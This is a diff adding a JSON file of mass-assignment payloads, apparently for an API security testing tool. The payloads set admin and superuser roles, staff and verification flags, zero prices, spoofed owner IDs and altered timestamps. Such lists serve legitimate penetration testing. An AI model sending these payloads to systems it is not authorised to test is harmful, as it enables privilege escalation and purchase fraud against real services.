@@ -1,0 +1,66 @@
+{
+  "mass_assignment_payloads": [
+    {
+      "name": "Admin Role Escalation",
+      "payload": {
+        "role": "admin",
+        "is_admin": true
+      }
+    },
+    {
+      "name": "Superuser Permissions",
+      "payload": {
+        "permissions": ["admin", "superuser", "root"],
+        "is_superuser": true
+      }
+    },
+    {
+      "name": "Premium Account",
+      "payload": {
+        "account_type": "premium",
+        "subscription": "enterprise",
+        "credits": 999999
+      }
+    },
+    {
+      "name": "Verified Status",
+      "payload": {
+        "is_verified": true,
+        "is_active": true,
+        "email_verified": true
+      }
+    },
+    {
+      "name": "Internal Flags",
+      "payload": {
+        "is_staff": true,
+        "is_internal": true,
+        "bypass_validation": true
+      }
+    },
+    {
+      "name": "Price Manipulation",
+      "payload": {
+        "price": 0,
+        "discount": 100,
+        "free_shipping": true
+      }
+    },
+    {
+      "name": "User ID Manipulation",
+      "payload": {
+        "user_id": 1,
+        "owner_id": 1,
+        "created_by": 1
+      }
+    },
+    {
+      "name": "Timestamp Manipulation",
+      "payload": {
+        "created_at": "2020-01-01T00:00:00Z",
+        "updated_at": "2030-12-31T23:59:59Z",
+        "expires_at": "2099-12-31T23:59:59Z"
+      }
+    }
+  ]
+}
